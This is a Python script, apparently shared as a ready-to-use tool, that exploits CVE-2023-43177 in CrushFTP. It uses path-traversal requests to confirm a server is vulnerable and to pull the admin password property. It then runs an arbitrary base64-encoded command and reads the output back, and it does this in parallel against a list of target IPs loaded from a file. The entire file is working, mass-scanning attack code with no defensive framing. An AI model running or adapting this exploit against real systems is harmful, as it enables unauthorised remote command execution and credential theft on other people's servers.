#made by NRPE | react2shell
import requests
import base64
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

DEFAULT_PORT = 8080
TIMEOUT = 15
MAX_WORKERS = 10
USER_AGENT = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'

def print_status(message, color=Colors.BLUE):
    print(f"{color}[*] {message}{Colors.END}")

def print_success(message):
    print(f"{Colors.GREEN}[+] {message}{Colors.END}")

def print_error(message):
    print(f"{Colors.RED}[-] {message}{Colors.END}")

class CrushFTPExploit:
    def __init__(self, target_ip, target_port=DEFAULT_PORT, timeout=TIMEOUT):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.base_url = f"http://{target_ip}:{target_port}/WebInterface/function/"
        self.secret = None
        
    def is_vuln(self):
        try:
            data = {"command": "exists", "path": "../../CrushFTP.jar"}
            response = requests.post(
                self.base_url,
                data=data,
                headers={"User-Agent": USER_AGENT},
                timeout=self.timeout,
                verify=False
            )
            return response.json().get("value") == True
        except:
            return False
    
    def get_token(self):
        try:
            data = {"command": "getUserProperty", "property": "password", "username": "admin"}
            response = requests.post(
                self.base_url,
                data=data,
                headers={"User-Agent": USER_AGENT},
                timeout=self.timeout,
                verify=False
            )
            self.secret = response.json().get("value")
            return self.secret is not None
        except:
            return False
    
    def execute_command(self, command):
        if not self.secret:
            if not self.get_token():
                return None
        
        try:
            encoded_cmd = base64.b64encode(command.encode()).decode()
            
            data = {
                "command": "zip",
                "path": "*",
                "items": "../../../../../../../../../../../../../../tmp/",
                "target": "test.zip",
                "secret": self.secret,
                "code": encoded_cmd
            }
            
            response = requests.post(
                self.base_url,
                data=data,
                headers={"User-Agent": USER_AGENT},
                timeout=self.timeout,
                verify=False
            )
            
            output_data = {
                "command": "readFile",
                "filename": "../../../../../../../../../../../../../../tmp/output.txt",
                "secret": self.secret
            }
            
            output_response = requests.post(
                self.base_url,
                data=output_data,
                headers={"User-Agent": USER_AGENT},
                timeout=self.timeout,
                verify=False
            )
            
            return output_response.json().get("contents", "No output")
            
        except Exception as e:
            return f"Error: {str(e)}"

def exploit_target(target_info, command):
    target_ip = target_info.strip()
    if not target_ip or target_ip.startswith('#'):
        return None
    
    if ':' in target_ip:
        target_ip, target_port = target_ip.split(':')
        target_port = int(target_port)
    else:
        target_port = DEFAULT_PORT
    
    exploit = CrushFTPExploit(target_ip, target_port)
    
    print_status(f"Testing {target_ip}:{target_port}")
    
    if not exploit.is_vuln():
        print_error(f"{target_ip}:{target_port} - Not vulnerable")
        return None
    
    print_success(f"{target_ip}:{target_port} - Vulnerable!")
    
    if not exploit.get_token():
        print_error(f"{target_ip}:{target_port} - Failed to get secret")
        return None
    
    print_success(f"{target_ip}:{target_port} - Secret: {exploit.secret}")
    
    result = exploit.execute_command(command)
    
    if result:
        print_success(f"{target_ip}:{target_port} - Command executed")
        print(f"Output: {result}")
    else:
        print_error(f"{target_ip}:{target_port} - Command execution failed")
    
    return result

def load_targets(ip_file, command, max_workers=MAX_WORKERS):
    if not os.path.exists(ip_file):
        print_error(f"File not found: {ip_file}")
        return
    
    with open(ip_file, 'r') as f:
        targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    if not targets:
        print_error("No valid targets found")
        return
    
    print_success(f"Loaded {len(targets)} targets")
    print_status(f"Command: {command}")
    print()
    
    successful = 0
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(exploit_target, target, command): target for target in targets}
        
        for future in as_completed(futures):
            try:
                if future.result():
                    successful += 1
            except Exception as e:
                print_error(f"Exception: {e}")
    
    print()
    print_success(f"Complete: {successful}/{len(targets)} successful")

def main():
    ip_file = "ips.txt"
    command = "id"  # change this
    
    print(f"{Colors.BLUE}=== CVE-2023-43177 CrushFTP RCE ==={Colors.END}")
    print()
    
    load_targets(ip_file, command)

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
